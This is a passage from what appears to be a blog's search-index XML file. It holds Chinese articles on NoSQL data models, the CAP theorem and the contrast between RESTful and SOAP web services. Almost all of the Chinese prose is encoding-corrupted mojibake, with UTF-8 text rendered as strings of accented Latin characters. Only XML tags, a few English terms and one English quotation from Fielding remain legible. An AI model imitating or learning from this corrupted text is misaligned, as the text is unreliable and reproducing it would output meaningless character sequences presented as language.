ÂçäÁªìÊûÑÂåñÊï∞ÊçÆÊó†ÈúÄÂÆö‰πâÊï∞ÊçÆÁöÑÁªìÊûÑ(schema free), ‰ΩøÂæóÂÖ∂Âú®Â≠òÂÇ®‰∏äË°®Áé∞Âá∫Âº∫Â§ßÁöÑÁÅµÊ¥ªÊÄß„ÄÇÂçäÁªìÊûÑÂåñÊï∞ÊçÆ: HTML, JSON, XML ÈùûÁªìÊûÑÂåñÊï∞ÊçÆ(unstructured data) Áõ∏ÂØπ‰∫éÁªìÊûÑÂåñÊï∞ÊçÆËÄåË®ÄÔºå‰∏çÊñπ‰æøÁî®Êï∞ÊçÆÂ∫ì‰∫åÁª¥ÈÄªËæëË°®Êù•Ë°®Áé∞ÁöÑÊï∞ÊçÆÂç≥Áß∞‰∏∫ÈùûÁªìÊûÑÂåñÊï∞ÊçÆ„ÄÇÈùûÁªìÊûÑÂåñÊï∞ÊçÆÂ∫ìÊòØÊåáÂÖ∂Â≠óÊÆµÈïøÂ∫¶ÂèØÂèòÔºåÂπ∂‰∏îÊØè‰∏™Â≠óÊÆµÁöÑËÆ∞ÂΩïÂèàÂèØ‰ª•Áî±ÂèØÈáçÂ§çÊàñ‰∏çÂèØÈáçÂ§çÁöÑÂ≠êÂ≠óÊÆµÊûÑÊàêÁöÑÊï∞ÊçÆÂ∫ìÔºåÁî®ÂÆÉ‰∏ç‰ªÖÂèØ‰ª•Â§ÑÁêÜÁªìÊûÑÂåñÊï∞ÊçÆ(Â¶ÇÊï∞Â≠ó„ÄÅÁ¨¶Âè∑Á≠â‰ø°ÊÅØ), ËÄå‰∏îÊõ¥ÈÄÇÂêàÂ§ÑÁêÜÈùûÁªìÊûÑÂåñÊï∞ÊçÆÔºàÂÖ®ÊñáÊñáÊú¨„ÄÅÂõæË±°„ÄÅÂ£∞Èü≥„ÄÅÂΩ±ËßÜ„ÄÅË∂ÖÂ™í‰ΩìÁ≠â‰ø°ÊÅØ)„ÄÇ ÈùûÁªìÊûÑÂåñWEBÊï∞ÊçÆÂ∫ì‰∏ªË¶ÅÊòØÈíàÂØπÈùûÁªìÊûÑÂåñÊï∞ÊçÆËÄå‰∫ßÁîüÁöÑÔºå‰∏é‰ª•ÂæÄÊµÅË°åÁöÑÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ìÁõ∏ÊØîÔºåÂÖ∂ÊúÄÂ§ßÂå∫Âà´Âú®‰∫éÂÆÉÁ™ÅÁ†¥‰∫ÜÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ìÁªìÊûÑÂÆö‰πâ‰∏çÊòìÊîπÂèòÂíåÊï∞ÊçÆÂÆöÈïøÁöÑÈôêÂà∂ÔºåÊîØÊåÅÈáçÂ§çÂ≠óÊÆµ„ÄÅÂ≠êÂ≠óÊÆµ‰ª•ÂèäÂèòÈïøÂ≠óÊÆµÂπ∂ÂÆûÁé∞‰∫ÜÂØπÂèòÈïøÊï∞ÊçÆÂíåÈáçÂ§çÂ≠óÊÆµËøõË°åÂ§ÑÁêÜÂíåÊï∞ÊçÆÈ°πÁöÑÂèòÈïøÂ≠òÂÇ®ÁÆ°ÁêÜÔºåÂú®Â§ÑÁêÜËøûÁª≠‰ø°ÊÅØÔºàÂåÖÊã¨ÂÖ®Êñá‰ø°ÊÅØÔºâÂíåÈùûÁªìÊûÑÂåñ‰ø°ÊÅØÔºàÂåÖÊã¨ÂêÑÁßçÂ§öÂ™í‰Ωì‰ø°ÊÅØÔºâ‰∏≠ÊúâÁùÄ‰º†ÁªüÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ìÊâÄÊó†Ê≥ïÊØîÊãüÁöÑ‰ºòÂäø„ÄÇÈùûÁªìÊûÑÂåñÊï∞ÊçÆ: ÊâÄÊúâÊ†ºÂºèÁöÑÂäûÂÖ¨ÊñáÊ°£„ÄÅÊñáÊú¨„ÄÅÂõæÁâá„ÄÅXML„ÄÅHTML„ÄÅÂêÑÁ±ªÊä•Ë°®„ÄÅÂõæÂÉèÂíåÈü≥È¢ë/ËßÜÈ¢ë‰ø°ÊÅØÁ≠âÁ≠â„ÄÇ Â≠òÂÇ®Êó∂Êï∞ÊçÆÊï∞ÊçÆÂ≠òÂÇ®Ê®°ÂûãÂÄºÊï∞ÊçÆÂ≠òÂÇ®Êó∂Â¶Ç‰ΩïÁªÑÁªá ÂÖ≥Á≥ªÊ®°ÂûãÂÖ≥Á≥ªÊ®°Âûã: Êñ∞ÂÆö‰πâÂàó, ÁÑ∂ÂêéÈÄöËøáË°åÁöÑÊñπÂºèÂØπÊï∞ÊçÆËøõË°åÂ≠òÂÇ®, ‰ª•‰∫åÁª¥Ë°®Êù•Ë°®Á§∫ÂÆû‰Ωì‰∏éÂÆû‰Ωì‰πãÈó¥ÁöÑËÅîÁ≥ªÔºåÂú®Êï∞ÊçÆÂª∫Ê®°Êó∂ÈúÄË¶ÅÂØπÊï∞ÊçÆÂØπË±°ËøõË°åÊãÜÂàÜÔºåÂÜçÂ∞ÜÂêÑËá™ÁöÑ‰ø°ÊÅØÂ≠òÂà∞ÂØπÂ∫îÁöÑË°®ÈáåÔºåÂú®ÈúÄË¶ÅÊó∂ÂÜçÂ∞ÜÂêÑ‰∏™Ë°®ËøûÊé•Ëµ∑Êù•„ÄÇ Âú®ÂÖ≥Á≥ªÊ®°ÂûãÂΩì‰∏≠ÔºåÂ§ö‰∏™Ë°®‰∏≠ÁöÑ‰∏çÂêåËÆ∞ÂΩïÁªèÂ∏∏‚Äú‰∫§ÈîôËøûÊé•‚ÄùÔºå‰∏Ä‰∫õÊï∞ÊçÆ‰ºöË¢´Â§öÊù°ËÆ∞ÂΩïÂÖ±‰∫´„ÄÇËøôÊ†∑ÁöÑÂ•ΩÂ§ÑÂ∞±ÊòØÂáèÂ∞ë‰∫ÜÈáçÂ§çÊï∞ÊçÆÁöÑÂá∫Áé∞Ôºå‰ΩÜÊòØËøôÊ†∑‰∏çÂ•ΩÁöÑÂú∞ÊñπÂ∞±ÊòØ‰∏ÄÊó¶ÂÖ∂‰∏≠Êüê‰∏ÄÊù°ÈìæÊé•ÁöÑËÆ∞ÂΩïÂèëÁîüÊîπÂèòÔºåÈÇ£‰πà‰∏éÂÖ∂Áõ∏ÂÖ≥ÁöÑËÆ∞ÂΩïÂíåË°®ÈÉΩ‰ºöË¢´ÈîÅ‰Ωè‰ª•Èò≤Ê≠¢Èùû‰∏ÄËá¥ÊÄßÁöÑÂá∫Áé∞„ÄÇ ACID‰∫ãÂä°Âú®ÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ì‰∏≠ÊòØÂæàÂ§çÊùÇÁöÑÔºåÂõ†‰∏∫Êï∞ÊçÆ‰ºöÊâ©Êï£„ÄÇÂç≥‰æøÊòØÂçï‰∏ÄÊù°ËÆ∞ÂΩïÔºåËøôÂ§çÊùÇÁöÑÂÖ±‰∫´Êï∞ÊçÆÂÜÖÈÉ®ÂÖ≥Á≥ªÁΩëÁöÑÂ≠òÂú®Ôºå‰πü‰ΩøÂæóÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂú®Â§ö‰∏™ÊúçÂä°Âô®‰πãÈó¥ÁöÑ‰º†ÈÄíÂèòÂæóÂ§çÊùÇËÄåÁºìÊÖ¢ÔºåÂêåÊó∂ËÆ©ËØªÂíåÂÜôÊìç‰ΩúÁöÑÊÄßËÉΩÂèòÂ∑Æ„ÄÇÂΩìÂ≠òÂÇ®Á©∫Èó¥ÊòÇË¥µÂèàÁ®ÄÂ∞ëÊó∂ÔºåÊäò‰∏≠ÁöÑÊùÉË°°ÊñπÊ°àÊòØÂæàÂøÖË¶ÅÁöÑ„ÄÇÁÑ∂ËÄåÔºåÂ¶Ç‰ªäÂ≠òÂÇ®Á©∫Èó¥ÁöÑ‰ª∑Ê†ºË∑ü40Âπ¥ÂâçÁõ∏ÊØîÂ∑≤ÁªèÂ§ßÂ§ßÁöÑ‰∏ãÈôç‰∫ÜÔºåÂæàÂ§öÊó∂ÂÄôËÆ°ÁÆóÊäò‰∏≠ÊñπÊ°àÂ∑≤ÁªèÂÆåÂÖ®Ê≤°ÊúâÂøÖË¶Å„ÄÇ‰ΩøÁî®Êõ¥Â§öÁöÑÂ≠òÂÇ®Á©∫Èó¥Êù•Êç¢ÂèñÊõ¥Â•ΩÁöÑÊìç‰ΩúÊÄßËÉΩÔºåÊàñËÄÖÊòØÂ∞ÜÂ∑•‰ΩúË¥üËΩΩÂàÜÈÖçÂà∞Â§öÂè∞Êú∫Âô®‰∏äÔºåËøôÊâçÊòØÂ¶Ç‰ªäÂ∫îÁî®‰∏äÊõ¥Â•ΩÁöÑËß£ÂÜ≥ÊñπÊ°à„ÄÇ ÊñáÊ°£Ê®°ÂûãÊñáÊ°£Êï∞ÊçÆ: Â∞Ü‰∏Ä‰∏™Êï∞ÊçÆËÆ∞ÂΩï(recordÊàñËÄÖrow)‰Ωú‰∏∫Âçï‰ΩçËøõË°åÂ≠òÂÇ®, Êó†ÈúÄÂÆö‰πâË°å„ÄÇ‰πüÂèØ‰ª•ËÆ§‰∏∫‰∏Ä‰∏™ÊñáÊ°£Â∞±ÊòØÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ìÁöÑ‰∏ÄË°å„ÄÇ ‰ΩøÁî®‚ÄúÊñáÊ°£‚ÄùËøô‰∏™ËØç‰ºº‰πéËÆ©‰∫∫ËßâÂæóÂ•áÊÄ™Ôºå‰ΩÜÊòØÂÖ∂ÂÆû‚ÄùÊñáÊ°£ÂûãÊï∞ÊçÆÊ®°Âûã‚ÄùÁúüÁöÑÂíå‰º†ÁªüÊÑè‰πâÁöÑÊñáÂ≠ó‚ÄùÊñáÊ°£‚ÄùÊ≤°Êúâ‰ªÄ‰πàÂÖ≥Á≥ª„ÄÇ‰ªñ‰∏çÊòØ‰π¶„ÄÅ‰ø°ÊàñËÄÖÊñáÁ´†ÔºåËøôÈáåËØ¥ÁöÑ‚ÄùÊñáÊ°£‚ÄùÂÖ∂ÂÆûÊòØ‰∏Ä‰∏™Êï∞ÊçÆËÆ∞ÂΩï, Ëøô‰∏™ËÆ∞ÂΩïËÉΩÂ§üÂØπÂåÖÂê´ÁöÑÊï∞ÊçÆÁ±ªÂûãÂíåÂÜÖÂÆπËøõË°å‚ÄúËá™ÊàëÊèèËø∞‚Äù„ÄÇXMLÊñáÊ°£„ÄÅHTMLÊñáÊ°£ÂíåJSON ÊñáÊ°£Â∞±Â±û‰∫éËøô‰∏ÄÁ±ª, Âõ†Ê≠§Êàë‰ª¨ÂèØ‰ª•ËÆ§‰∏∫ÊâÄÊúâÂçäÁªìÊûÑÂåñÁöÑÊï∞ÊçÆÈÉΩÂ±û‰∫éÊñáÊ°£Êï∞ÊçÆ, ËÄåÁé∞Âú®‰∏ªË¶ÅÁöÑÊñáÊ°£Êï∞ÊçÆÂ∫ìËøòÊòØ‰ª•Json‰Ωú‰∏∫ÊñáÊ°£‰∏∫‰∏ª.ÂèØ‰ª•ÁúãÂà∞ÔºåÊï∞ÊçÆÊòØ‰∏çËßÑÂàôÁöÑÔºåÊØè‰∏ÄÊù°ËÆ∞ÂΩïÂåÖÂê´‰∫ÜÊâÄÊúâÁöÑÊúâÂÖ≥ËØ•ËÆ∞ÂΩïÁöÑ‰ø°ÊÅØËÄåÊ≤°Êúâ‰ªª‰ΩïÂ§ñÈÉ®ÁöÑÂºïÁî®, ËøôÊù°ËÆ∞ÂΩïÂ∞±ÊòØ‚ÄúËá™ÂåÖÂê´‚ÄùÁöÑ„ÄÇËøôÂ∞±‰ΩøÂæóËÆ∞ÂΩïÂæàÂÆπÊòìÂÆåÂÖ®ÁßªÂä®Âà∞ÂÖ∂‰ªñÊúçÂä°Âô®, Âõ†‰∏∫ËøôÊù°ËÆ∞ÂΩïÁöÑÊâÄÊúâ‰ø°ÊÅØÈÉΩÂåÖÂê´Âú®ÈáåÈù¢‰∫Ü, ‰∏çÈúÄË¶ÅËÄÉËôëËøòÊúâ‰ø°ÊÅØÂú®Âà´ÁöÑË°®Ê≤°Êúâ‰∏ÄËµ∑ËøÅÁßªËµ∞„ÄÇÂêåÊó∂ÔºåÂõ†‰∏∫Âú®ÁßªÂä®ËøáÁ®ã‰∏≠ÔºåÂè™ÊúâË¢´ÁßªÂä®ÁöÑÈÇ£‰∏ÄÊù°ËÆ∞ÂΩïÈúÄË¶ÅÊìç‰ΩúËÄå‰∏çÂÉèÂÖ≥Á≥ªÂûã‰∏≠ÊØè‰∏™ÊúâËÅîÁ≥ªÁöÑË°®ÈÉΩÈúÄË¶ÅÈîÅ‰ΩèÊù•‰øùËØÅ‰∏ÄËá¥ÊÄßÔºåËøôÊ†∑‰∏ÄÊù•ACIDÁöÑ‰øùËØÅÂ∞±‰ºöÂèòÂæóÊõ¥Âø´ÈÄü, ËØªÂÜôÁöÑÈÄüÂ∫¶‰πü‰ºöÊúâÂæàÂ§ßÁöÑÊèêÂçá„ÄÇ ÂÅ•ÂÄºÊ®°ÂûãÂÅ•ÂÄºÊ®°Âûã: ÂÆÉÁöÑÊï∞ÊçÆÊåâÁÖßÈîÆÂÄºÂØπÁöÑÂΩ¢ÂºèËøõË°åÁªÑÁªá,Á¥¢ÂºïÂíåÂ≠òÂÇ®„ÄÇKVÂ≠òÂÇ®ÈùûÂ∏∏ÈÄÇÂêà‰∏çÊ∂âÂèäËøáÂ§öÊï∞ÊçÆÂÖ≥Á≥ª‰∏öÂä°ÂÖ≥Á≥ªÁöÑ‰∏öÂä°Êï∞ÊçÆÔºåÂêåÊó∂ËÉΩÊúâÊïàÂáèÂ∞ëËØªÂÜôÁ£ÅÁõòÁöÑÊ¨°Êï∞ÔºåÊØîSQLÊï∞ÊçÆÂ∫ìÂ≠òÂÇ®Êã•ÊúâÊõ¥Â•ΩÁöÑËØªÂÜôÊÄßËÉΩ„ÄÇ ÂàóÂºèÊ®°ÂûãÂàóÂºèÂ≠òÂÇ®: ‰ª•ÂàóÁõ∏ÂÖ≥Â≠òÂÇ®Êû∂ÊûÑËøõË°åÊï∞ÊçÆÂ≠òÂÇ®„ÄÇÂàóÂºèÂ≠òÂÇ®‰ª•ÊµÅÁöÑÊñπÂºèÂú®Âàó‰∏≠Â≠òÂÇ®ÊâÄÊúâÁöÑÊï∞ÊçÆÔºå‰∏ªË¶ÅÈÄÇÂêà‰∏éÊâπÈáèÊï∞ÊçÆÂ§ÑÁêÜÂíåÂç≥Â∏≠Êü•ËØ¢„ÄÇ Áî±‰∫éÊü•ËØ¢ÈúÄË¶ÅËØªÂèñÁöÑblocksÂ∞ë, ÊâÄ‰ª•Êü•ËØ¢Âø´, Âõ†‰∏∫Âêå‰∏ÄÁ±ªÂûãÁöÑÂàóÂ≠òÂÇ®Âú®‰∏ÄËµ∑, ÊâÄ‰ª•Êï∞ÊçÆÂéãÁº©ÊØîÈ´ò, LoadÂø´„ÄÇ ÂÆÉÁÆÄÂåñÊï∞ÊçÆÂª∫Ê®°ÁöÑÂ§çÊùÇÊÄß„ÄÇ‰ΩÜÊòØÊèíÂÖ•Êõ¥Êñ∞ÊÖ¢Ôºå‰∏çÂ§™ÈÄÇÂêàÊï∞ÊçÆËÄÅÊòØÂèòÂåñÔºåÂÆÉÊòØÊåâÂàóÂ≠òÂÇ®ÁöÑ„ÄÇ ÂàóÂºèÂ≠òÂÇ®ÂæàÈÄÇÂêàÂÅöÊï∞ÊçÆ‰ªìÂ∫ìÔºåÂÆÉ‰∏çÈÄÇÂêàOLTP„ÄÇ CAPÂÆöÁêÜÂú®ËÆ°ÁÆóÊú∫ÁßëÂ≠¶‰∏≠, CAPÂÆöÁêÜ(CAP theorem), ÂèàË¢´Áß∞‰ΩúÂ∏ÉÈ≤ÅÂ∞îÂÆöÁêÜ(Brewer&#39;s theorem), ÂÆÉÊåáÂá∫ÂØπ‰∫é‰∏Ä‰∏™ÂàÜÂ∏ÉÂºèËÆ°ÁÆóÁ≥ªÁªüÊù•ËØ¥Ôºå‰∏çÂèØËÉΩÂêåÊó∂Êª°Ë∂≥‰ª•‰∏ã‰∏âÁÇπ: ‰∏ÄËá¥ÊÄß(Consistency) (ÊâÄÊúâËäÇÁÇπÂú®Âêå‰∏ÄÊó∂Èó¥ÂÖ∑ÊúâÁõ∏ÂêåÁöÑÊï∞ÊçÆ) ÂèØÁî®ÊÄß(Availability) (‰øùËØÅÊØè‰∏™ËØ∑Ê±Ç‰∏çÁÆ°ÊàêÂäüÊàñËÄÖÂ§±Ë¥•ÈÉΩÊúâÂìçÂ∫î) ÂàÜÈöîÂÆπÂøç(Partition tolerance) (Á≥ªÁªü‰∏≠‰ªªÊÑè‰ø°ÊÅØÁöÑ‰∏¢Â§±ÊàñÂ§±Ë¥•‰∏ç‰ºöÂΩ±ÂìçÁ≥ªÁªüÁöÑÁªßÁª≠Ëøê‰Ωú) CAPÁêÜËÆ∫ÁöÑÊ†∏ÂøÉÊòØÔºö‰∏Ä‰∏™ÂàÜÂ∏ÉÂºèÁ≥ªÁªü‰∏çÂèØËÉΩÂêåÊó∂ÂæàÂ•ΩÁöÑÊª°Ë∂≥‰∏ÄËá¥ÊÄßÔºåÂèØÁî®ÊÄßÂíåÂàÜÂå∫ÂÆπÈîôÊÄßËøô‰∏â‰∏™ÈúÄÊ±ÇÔºåÊúÄÂ§öÂè™ËÉΩÂêåÊó∂ËæÉÂ•ΩÁöÑÊª°Ë∂≥‰∏§‰∏™„ÄÇÂõ†Ê≠§ÔºåÊ†πÊçÆCAPÂéüÁêÜÂ∞ÜNoSQLÊï∞ÊçÆÂ∫ìÂàÜÊàê‰∫ÜÊª°Ë∂≥CAÂéüÂàô„ÄÅÊª°Ë∂≥CPÂéüÂàôÂíåÊª°Ë∂≥APÂéüÂàô‰∏â Â§ßÁ±ªÔºö CA ÂçïÁÇπÈõÜÁæ§ÔºåÊª°Ë∂≥‰∏ÄËá¥ÊÄßÔºåÂèØÁî®ÊÄßÁöÑÁ≥ªÁªüÔºåÈÄöÂ∏∏Âú®ÂèØÊâ©Â±ïÊÄß‰∏ä‰∏çÂ§™Âº∫Â§ß„ÄÇ CP Êª°Ë∂≥‰∏ÄËá¥ÊÄßÔºåÂàÜÂå∫ÂÆπÂøçÊÄßÁöÑÁ≥ªÁªüÔºåÈÄöÂ∏∏ÊÄßËÉΩ‰∏çÊòØÁâπÂà´È´ò„ÄÇ AP Êª°Ë∂≥ÂèØÁî®ÊÄßÔºåÂàÜÂå∫ÂÆπÂøçÊÄßÁöÑÁ≥ªÁªüÔºåÈÄöÂ∏∏ÂèØËÉΩÂØπ‰∏ÄËá¥ÊÄßË¶ÅÊ±Ç‰Ωé‰∏Ä‰∫õ„ÄÇ ÂÆöÁêÜ: ‰ªª‰ΩïÂàÜÂ∏ÉÂºèÁ≥ªÁªüÊúÄÂ§öÂè™ËÉΩÂêåÊó∂Êó∂Êª°Ë∂≥3ÁÇπ(Consistency, Availability, Partition tolerance)‰∏≠ÁöÑ2ÁÇπ, ÂêåÊó∂Êª°Ë∂≥3ÁÇπÁöÑÂàÜÂ∏ÉÂºèÁ≥ªÁªüÊòØ‰∏çÂ≠òÂú®ÁöÑÂø†ÂëäÔºöÊû∂ÊûÑÂ∏à‰∏çË¶ÅÂ∞ÜÁ≤æÂäõÊµ™Ë¥πÂú®Â¶Ç‰ΩïËÆæËÆ°ËÉΩÊª°Ë∂≥‰∏âËÄÖÁöÑÂÆåÁæéÂàÜÂ∏ÉÂºèÁ≥ªÁªüÔºåËÄåÊòØÂ∫îËØ•ËøõË°åÂèñËàç„ÄÇ CAP‰∏éÊï∞ÊçÆÂ∫ìRDBMSÊª°Ë∂≥ÁöÑÊòØACIDËßÑÂàô, ËÄåACIDËßÑÂàôÊª°Ë∂≥ÁöÑÂ∞±ÊòØCAPÈáåÈù¢ÁöÑCA, Âõ†Ê≠§Êâ©Â±ïÊÄß‰∏çÂº∫.NewSQL/NoSQLÊª°Ë∂≥ÁöÑÊòØBASEËßÑÂàô, ËÄåBASEËßÑÂàôÂ∞±ÊòØÈôç‰Ωé‰∏ÄËá¥ÊÄßÊàñËÄÖÂèØÁî®ÊÄßÊù•ÊèêÂçáÁ≥ªÁªüÊÄßËÉΩ, Â∞±ÊòØCAPÈáåÈù¢ÁöÑCP/AP ÊÄªÁªìÂú®ÁêÜËß£‰∫Ü‰∏äÈù¢ÊâÄÊúâÁöÑÊ¶ÇÂøµËøáÂêé, Â∞±ËÉΩÁúãÊáÇËøôÂº†CAPÁöÑÂõæ‰∫Ü: ÂèÇËÄÉMongoDB ArchitectureÂÆòÊñπ‰∏≠Êñá‰ªãÁªçelasticsearch(lucene)ÂèØ‰ª•‰ª£ÊõøNoSQL(mongodb)ÂêóÔºü]]></content>
      <categories>
        <category>Êï∞ÊçÆÂ∫ì</category>
        <category>ÊñáÊ°£Êï∞ÊçÆÂ∫ì</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÂØπÊØîRESTful‰∏éSOAPÔºåÊ∑±ÂÖ•ÁêÜËß£RESTful]]></title>
    <url>%2F2017%2F10%2F03%2Frestful-vs-soap%2F</url>
    <content type="text"><![CDATA[Âú®ÊñáÁ´†ÂºÄÂßãÂâçËØ∑ÊÄùËÄÉÂ¶Ç‰∏ãÈóÆÈ¢ò: RESTÊòØÂï•? SOAPÊòØÂï•Ôºü‰∏∫‰ªÄ‰πà‰ºö‰∫ßÁîü‰ªñ‰ª¨Ôºü‰ª•Âèä‰ªñ‰ª¨ÈÉΩÊúâÂì™‰∫õÁâπÁÇπÔºü‰ªñ‰ª¨Âà∞Â∫ïÊúâÂì™‰∫õ‰∏çÂêåÔºüÊàë‰ª¨‰ªÄ‰πàÊó∂ÂÄôÈÄâÊã©RESTÔºå‰ªÄ‰πàÊó∂ÂÄôÈÄâÊã©SOAP. Âú®ËøôÈáåÊàë‰ª¨ÈÄöËøáÂØπÊØî‰ªñ‰ª¨Êù•Ëß£Á≠îÂâçÈù¢ÊèêÂá∫ÁöÑÈóÆÈ¢ò. ËØûÁîüÂú®ÂçÅÂ§öÂπ¥Ââç Êúâ2ÁßçÂæàÈáçË¶ÅÊûÑÂª∫web serviceÁöÑÊñπÊ≥ï: RESTful Âíå SOAP, SOAPÁöÑÂá∫Áé∞Á∫¶‰∏∫ÊØîRESTfulÊó©‰∏Ä‰∫õÔºåÂú®ÂºÄÂßã‰πãÂàù‰ªñ‰ª¨Âπ∂Ê≤°ÊúâÂàÜÂåñÔºå‰ªçÁÑ∂ÂÖ±Â≠òÊù•Ëß£ÂÜ≥‰∏çÂêåÁöÑÈúÄÊ±Ç„ÄÇ‰ΩÜÊòØÁé∞Âú®RESTfulÁõõË°åÔºåSOAPÊó•Ê∏êÊ≤°ËêΩÔºåÊâÄ‰ª•Êàë‰ª¨Êù•‰∫ÜËß£‰∏ã‰ªñ‰ª¨ÁöÑÂâç‰∏ñ‰ªäÁîü. RESTfulÂá∫ÁîüÂú®Â≠¶ÊúØÁïå,ÊúâÁùÄÊã•Êä±ÂºÄÊîæÁΩëÁªúÁöÑÂì≤Â≠¶,ËÄåSOAPÊòØÂ§ßÂûãËΩØ‰ª∂ÂÖ¨Âè∏‰∏∫‰∫ÜËß£ÂÜ≥‰ºÅ‰∏öÂ∏ÇÂú∫ÁöÑÈúÄË¶ÅËÄå‰∫ßÂá∫ÁöÑ„ÄÇËôΩÁÑ∂Áé∞Âú®RESTÁõõË°åÔºå‰ΩÜÊòØSOAPÁöÑÁ°Æ‰πüÊúâ‰ªñÁöÑ‰ºòÁÇπÔºåÊâÄÊúâÊàë‰ª¨ÈúÄË¶ÅÊØîËæÉËøô‰∏§‰∏™ÂçèËÆÆÔºåÂÅöÊ≠£Á°ÆÁöÑÂèñËàç. RESTfulÁÆÄ‰ªãRESTËøô‰∏™ËØçÔºåÊòØRoy Thomas FieldingÂú®‰ªñ2000Âπ¥ÁöÑÂçöÂ£´ËÆ∫Êñá‰∏≠ÊèêÂá∫ÁöÑ„ÄÇÂÆÉÊòØ‚ÄúRepresentational State Transfer‚ÄùÁöÑÁº©ÂÜô„ÄÇ‰ªñËøôÊ¨°ËÆ∫ÊñáÁöÑ‰∏ªÈ¢òÊòØÊé¢ËÆ®Âá†ÁßçÂü∫‰∫éÁΩëÁªúÁöÑËΩØ‰ª∂ËÆæËÆ°Êû∂ÊûÑÂíåÈ£éÊ†ºÔºå ËÄåRESTË¢´ÂÖ∑‰ΩìÊèèËø∞ÊòØÂú®‰ªñËÆ∫ÊñáÁöÑÁ¨¨5Á´†„ÄÇÂú®Ëøô‰∏™Á´†ËäÇ‰∏≠Ôºå‰ªñÊòØËøôÊ†∑ÊÄªÁªìRESTÁöÑ: provides a set of architectural constraints that, when applied as a whole, emphasizes scalability of component interactions, generality of interfaces, independent deployment of components, and intermediary components to reduce interaction latency, enforce security, and encapsulate legacy systems. ÂÆÉÊèê‰æõ‰∫Ü‰∏ÄÁªÑ‰ΩìÁ≥ªÁ∫¶ÊùüÔºåÂÖ∑‰ΩìÊúâËøô‰πàÂá†ÁÇπ: Êï¥‰ΩìÂÖ≥ËÅîÊÄß Âº∫Ë∞ÉÁªÑ‰ª∂‰∫§‰∫íÁöÑÂèØ‰º∏Áº©ÊÄß ÁªÑ‰ª∂ÁöÑÁã¨Á´ãÈÉ®ÁΩ≤ ‰∏ÄËà¨ÊÄßÁöÑÊé•Âè£ ‰ΩøÁî®‰∏≠Èó¥‰ª∂Êù•ÂáèÂ∞ë‰∫§Êç¢Âª∂Ëøü ÊâßË°åÂÆâÂÖ® ÊâÄ‰ª•,RESTÂèØ‰ª•Ë¢´ÊèèËø∞‰∏∫‰∏ÄÁßçÊûÑÂª∫WebÊúçÂä°ÊâÄÂ∫îËØ•ÈÅµÂæ™ÁöÑ‰∏ÄÁªÑÁâπÂÆöÁ∫¶Êùü(providerÂíåcustomer‰πãÈó¥ÁöÑ): client Á´ØÂíåserverÁ´ØÁöÑ ÂÖ≥Ê≥®ÁÇπÁöÑÂàÜÁ¶ª: client‰∏çÁî®ÂÖ≥Ê≥® Êï∞ÊçÆÁöÑÂ≠òÂÇ®Ôºå ËÄåserverÁ´Ø‰∏çÂøÖÂÖ≥Ê≥®Áî®Êà∑ÁïåÈù¢„ÄÇ‰ΩøÂæóclient Âíå server Ëß£ËÄ¶Ôºå‰ªéËÄåÂèñÂæóÈ´òÊâ©Â±ïÊÄß ÂÆ¢Êà∑Á´ØÂíåÊúçÂä°Âô®‰πãÈó¥ÁöÑÈÄö‰ø°ÂøÖÈ°ªÊó†Áä∂ÊÄÅ: ÊúçÂä°Âô®‰∏çÂ∫îËØ•Â≠òÂÇ®‰ªª‰Ωï Âíåclients‰πãÈó¥‰∫§‰∫íÁöÑ‰∏ä‰∏ãÊñá‰ø°ÊÅØ, Èô§‰∫ÜÁî®‰∫éÁª¥Êä§ËÆ§ËØÅÁöÑ‰ºöËØù‰ø°ÊÅØ„ÄÇ ÂÆ¢Êà∑Â∫îËØ•ËÉΩÂ§üÁºìÂ≠òÂìçÂ∫î: ÊâÄÊúâÊúçÂä°Âô®ÂìçÂ∫îÂ∫îËØ•ÂåÖÂê´Ë∂≥Â§üÁöÑÁºìÂ≠òÁõ∏ÂÖ≥ÁöÑ‰ø°ÊÅØ„ÄÇÂÆ¢Êà∑Á´ØÂèØ‰ª•‰æùÈù†Ëøô‰∫õ‰ø°ÊÅØÂÜ≥ÂÆöÊòØÂê¶ÈÄÇÂêàÁºìÂ≠òÂìçÂ∫î„ÄÇ ËøûÊé•ÂèØ‰ª•ÂèëÁîüÂú®Â§ö‰∏™ÈÄö‰ø°Â±Ç: ÊúçÂä°Á´Ø‰∏çÂ∫îËØ•Âå∫ÂàÜ ÂÆ¢Êà∑Á´Ø ÊòØÂê¶Áõ¥Êé•ËøûÊé•serverÔºåËøòÊòØÈÄöËøá‰∏≠Èó¥‰ª£ÁêÜÊù•ËøûÊé•server FieldingÊòØ‰∏Ä‰∏™ÈùûÂ∏∏ÈáçË¶ÅÁöÑ‰∫∫Ôºå‰ªñÊòØHTTPÂçèËÆÆÔºà1.0ÁâàÂíå1.1ÁâàÔºâÁöÑ‰∏ªË¶ÅËÆæËÆ°ËÄÖ„ÄÅApacheÊúçÂä°Âô®ËΩØ‰ª∂ÁöÑ‰ΩúËÄÖ‰πã‰∏Ä„ÄÅApacheÂü∫Èáë‰ºöÁöÑÁ¨¨‰∏Ä‰ªª‰∏ªÂ∏≠„ÄÇÊâÄ‰ª•Ôºå‰ªñÁöÑËøôÁØáËÆ∫Êñá‰∏ÄÁªèÂèëË°®ÔºåÂ∞±ÂºïËµ∑‰∫ÜÂÖ≥Ê≥®ÔºåÂπ∂‰∏îÁ´ãÂç≥ÂØπ‰∫íËÅîÁΩëÂºÄÂèë‰∫ßÁîü‰∫ÜÊ∑±ËøúÁöÑÂΩ±Âìç„ÄÇ ÊÄª‰ΩìÊù•ËØ¥RESTÂ∞±ÊòØwebÁöÑ‰∏ÄÁßçÊäΩË±°ÔºåRESTÂ∫îËØ•ÂÖÅËÆ∏‰ªª‰Ωïcustomer ‰ª•Âêå‰∏ÄÁßçÊñπÂºè‰∏éAPIËøõË°å‰∫§‰∫íÔºå ËÄå‰∏çÈúÄË¶ÅÁü•ÈÅìÂÖ∂ÂêéÈù¢ÁöÑÂ∑•‰ΩúÂéüÁêÜ„ÄÇ SOAPÁÆÄ‰ªãSOAP, ÊòØ‚ÄúSimple Object Access Protocol‚ÄùÁöÑÁº©ÂÜô, 